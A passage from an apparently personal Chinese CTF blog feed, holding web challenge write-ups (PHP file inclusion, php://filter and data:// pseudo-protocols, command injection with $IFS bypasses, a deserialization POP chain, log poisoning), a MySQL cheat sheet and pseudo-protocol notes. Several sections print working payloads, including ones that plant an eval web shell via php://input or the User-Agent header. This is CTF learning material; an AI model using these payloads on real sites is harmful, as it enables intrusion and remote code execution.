invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.server.php">PHP: $_SERVER - Manual</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 	得到：/php/index.php/test/foo</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] 得到：/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure>

<p>basename() 函数返回路径中的文件名部分。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/testweb/home.php&quot;</span>;</span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出示例</span></span><br><span class="line">home.php</span><br><span class="line">home</span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中<code>$_SERVER[&#39;PHP_SELF&#39;]</code>的值会到<code>basename()</code>函数中</p>
</li>
<li><p>其绕过原理为：在使用默认语言环境设置时，<code>basename()</code> 会删除文件名开头的非 ASCII 字符和中文，</p>
</li>
<li><p>这可以用来通过上面的正则过滤</p>
<p> url编码绕show_source</p>
</li>
<li><p>因为当我们传入<code>index.php/utils.php</code>时，仍然请求的是<code>index.php</code>，</p>
</li>
<li><p>但是当<code>basename()</code>处理后，<code>highlight_file()</code>得到的参数就变成了<code>utils.php</code>，从而我们就实现了任意文件包含</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/utils.php/%ff?%73how_source=1</span><br><span class="line">或者</span><br><span class="line">/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65=1</span><br></pre></td></tr></table></figure>

<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>hint is hear Can you find out the hint.php?</p>
<p>get传参伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>

<p>PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4&#x3D;</p>
<p>访问&#x2F;test2222222222222.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">    echo &quot;success\n&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF-2019-Ping-Ping-Ping已解决"><a href="#GXYCTF-2019-Ping-Ping-Ping已解决" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping已解决"></a>[GXYCTF 2019]Ping Ping Ping已解决</h2><p>解法一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>解法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>解法三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;a=ag;b=fl;tac$IFS$9$b$a.php</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">// ‮⁦NISACTF⁩⁦Welcome to</span><br><span class="line">if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b</span><br><span class="line">    echo $FLAG;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不可见字符，unicode字符</p>
<p>复制到txt文档中010打开后就提取16进制替换空格为百分号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span><br></pre></td></tr></table></figure>

<h2 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h2><h2 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="SWPUCTF 2021 新生赛]pop"></a>SWPUCTF 2021 新生赛]pop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m;</span><br><span class="line">$b=new w33m;</span><br><span class="line">$c=new w44m;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$b-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include($_POST[&quot;flag&quot;]);</span><br><span class="line">//flag in /var/www/html/flag.php;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = $_POST[&quot;flag&quot;];</span><br><span class="line">if (strlen(file_get_contents(&#x27;php://input&#x27;)) &lt; 800 &amp;&amp; preg_match(&#x27;/flag/&#x27;, $path)) &#123;</span><br><span class="line">    echo &#x27;nssctf waf!&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @include($path);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>post内容大于800即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">垃圾数据&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>-nss</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql语法</title>
    <url>/2023/02/16/mysql/</url>
    <content><![CDATA[<p>mysql语法</p>
  <span id="more"></span>

<p><a href="https://blog.csdn.net/mshxuyi/article/details/88046146">(3条消息) ＭySQL 创建数据库&#x2F;表&#x2F;字段_数据库建表字段_tom.ma的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/ThinkWon/article/details/106610831">(3条消息) MySQL删除表的三种方式_mysql怎么删除表_ThinkWon的博客-CSDN博客</a></p>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>mysql 数据库语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p  #登陆mysql 密码为空直接回车进入</span><br></pre></td></tr></table></figure>

<p>MySQL 修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;newpasswd&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>1、查询所有数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><strong>２、创建数据库 school</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database school default character set utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p><strong>３、进入school 数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use school;</span><br></pre></td></tr></table></figure>

<p><strong>4、显示当前数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| school     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>5、创建空表 student</p>
<p>mysql&gt; create table student;</p>
<p>6、创建带字段的表 student (id,name,age)</p>
<pre><code>#id 整型 主建 不能为空 自动增长
#name 字符型长度50 不能为空
#age 整型 不能为空 默认值18
 
mysql&gt; create table student(
    -&gt; id int primary key not null auto_increment,
    -&gt; name varchar(50) not null,
    -&gt; age int not null default 18
    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre>
<p>7、查询所有表</p>
<p>mysql&gt; show tables;</p>
<p>8、查询表结构</p>
<pre><code>mysql&gt; desc student;
+-------+-------------+------+-----+---------+----------------+
| Field | Type        | Null | Key | Default | Extra          |
+-------+-------------+------+-----+---------+----------------+
| id    | int(11)     | NO   | PRI | NULL    | auto_increment |
| name  | varchar(50) | NO   |     | NULL    |                |
| age   | int(11)     | NO   |     | 18      |                |
+-------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
</code></pre>
<p>9、查询表的详细信息</p>
<pre><code>mysql&gt; show create table student;
</code></pre>
<p>10、插入数据</p>
<pre><code>mysql&gt; insert into student (name,age) values
     &gt; (&#39;tom&#39;,20),
     &gt; (&#39;alice&#39;,16),
     &gt; (&#39;helen&#39;,22);
</code></pre>
<p>11、清空数据表内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">truncate table student;</span><br></pre></td></tr></table></figure>

<p>12、复制表结构，表数据</p>
<pre><code>#方法一
mysql&gt; create table student_2 like student;  #创建student_2表 并复制student表结构
mysql&gt; insert into student_2 select * from student;  #复制student表数据到student_2中
 
#方法二
create table student3 select * from student;  #创建 student3 并复制student表结构和数据
</code></pre>
<p>13、重命名表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename table student_3 to student_4  #重命名表为student_4</span><br></pre></td></tr></table></figure>

<p>14.删除 user 表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table user;    #drop 是直接删除表信息，速度最快，但是无法找回数据</span><br><span class="line">truncate table user;   #truncate 是删除表数据，不删除表的结构，但不能与where一起使用</span><br><span class="line">delete from user;   #delete 是删除表中的数据，不删除表结构</span><br><span class="line">delete from user where user_id = 1;  </span><br></pre></td></tr></table></figure>

<p>15.修改字段内容</p>
<p>将name为tom的记录的age设置为20并将其gender设置为female MySQL命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<p>load_file(file_name)</p>
<p>其中file_name是文件的完整路径。</p>
<p>下面是我从一个文件中选择内容的示例:</p>
<p>select load_file(‘&#x2F;data&#x2F;test.txt’) as result;</p>
<p><strong>IF表达式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>如果 expr1 是TRUE (或者expr1 &lt;&gt; 0 且 expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p>
<p>substr函数格式 (俗称：字符截取函数)</p>
<p>格式1： substr(string str, int a, int b);<br>格式2： substr(string str, int a) ;</p>
<p>解释：</p>
<p>格式1：<br>    1、str 需要截取的字符串<br>    2、a   截取字符串的开始位置<br>    （注：当a等于1时，从第一位开始截取;当a等于0时，无截取字符串）<br>    3、b   要截取的字符串的长度</p>
<p>格式2：<br>    1、str 需要截取的字符串<br>    2、a   可以理解为从第a个字符开始截取后面所有的字符串。</p>
<p>SQL函数Group_concat用法</p>
<p>拼接字符串</p>
<p><a href="https://blog.csdn.net/qq_35531549/article/details/90383022">(6条消息) SQL函数Group_concat用法_group_concat sql_寸草心2130的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2023/01/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><code>php://input</code></p>
<p><code>data://text/plain</code>,xxxx</p>
<p><code>php://filter</code></p>
  <span id="more"></span>

<p>PHP常见的伪协议如下：</p>
<p>文件包含函数：</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>文件读取函数：</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
<table>
<thead>
<tr>
<th>file:&#x2F;&#x2F; 访问本地文件系统</th>
</tr>
</thead>
<tbody><tr>
<td>http:&#x2F;&#x2F; 访问HTTP(s)网址</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F; 访问FTP(s)URLs</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流(I&#x2F;O streams)</td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F; 压缩流</td>
</tr>
<tr>
<td>data:&#x2F;&#x2F; 数据(RFC 2397)</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F; 查找匹配的文件路径模式</td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F; PHP归档</td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F; Secure Shell 2</td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F; RAR</td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F; 音频流</td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F; 处理交互式的流</td>
</tr>
</tbody></table>
<p>在这里详细说一下这个<code>php://filter</code></p>
<p>,这个是常用的伪协议，一般用于任意文件读取，有的时候也可以用在getshell，在双off的情况下也可以使用。</p>
<p>在这里举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>关于上面这个，解释一下，首先file关键字的get参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码后，resourse&#x3D;index.php表示目标文件为index.php。</p>
<p>上面举的常用的伪协议的用法：</p>
<p>1.php伪协议<br>用法：<br><code>php://input</code>,用于执行php代码，需要post请求提交数据。</p>
<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<p>需要开启allow_url_fopen:php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory、php:&#x2F;&#x2F;temp<br>不需要开启allow_url_fopen:php:&#x2F;&#x2F;filter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>2.、data协议</p>
<p>用法：<br><code>data://text/plain</code>,xxxx(要执行的php代码)<br><code>data://text/plain;base64</code>,xxxx(base64编码后的数据)<br>例：<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<br>?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;</p>
<p>3.、file协议<br>用法：<br><code>file://</code>[本地文件系统的绝对路径]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=file:///etc/passsword</span><br></pre></td></tr></table></figure>

<p>三个&#x2F; 第三个杠是根目录上的杠</p>
<p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p>
<p>ctfshow</p>
<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?=`tac f*`;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a10018ad-9503-4957-9de2-24a693837991.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>同时ua 头写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">1=system(&quot;tac f*&quot;);  //post传入</span><br></pre></td></tr></table></figure>

<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把冒号过滤了伪协议用不了</p>
<p>解法一：日志包含和上题一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://167c670e-4138-48aa-9480-9f484963d114.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo`tac f*`;?&gt;  //ua传入</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>n1book</title>
    <url>/2023/03/10/n1book/</url>
    <content><![CDATA[<p>buu n1book</p>
<p>​    <span id="more"></span></p>
<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><p>dirserach多扫几遍就出来了</p>
<p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<p>得到n1book{info_1s_v3ry_imp0rtant_hack}</p>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露</p>
<p>没有权限</p>
<p><code>python GitHack.py http://2d7694d7-c42f-4c1d-951d-f94169586055.node4.buuoj.cn:81/.git/</code></p>
<p>生成一个index.html文件打开即有flag</p>
<p><a href="https://github.com/tigert1998/GitHack-py3">GitHub - tigert1998&#x2F;GitHack-py3: A <code>.git</code> folder disclosure exploit</a></p>
<p><code>n1book&#123;git_looks_s0_easyfun&#125;</code></p>
<h2 id="第一章-web入门-afr-1-1"><a href="#第一章-web入门-afr-1-1" class="headerlink" title="[第一章 web入门]afr_1 1"></a>[第一章 web入门]afr_1 1</h2><p> 任意文件读取函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<p>n1book{afr_1_solved}</p>
<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><p>目录穿透漏洞</p>
<p>打开源码发现照片</p>
<p><code>http://60eef043-945c-47a4-aee5-4ec00836a80e.node4.buuoj.cn:81/img../</code></p>
<p><code>n1book&#123;afr_2_solved&#125;</code></p>
<h2 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h2><p>我不会</p>
<p>[buuctf 刷题记录 <a href="https://blog.51cto.com/u_15127666/3287231">第一章 web入门]afr_3_51CTO博客_[第一章 web入门]afr_1 1</a></p>
<h2 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ 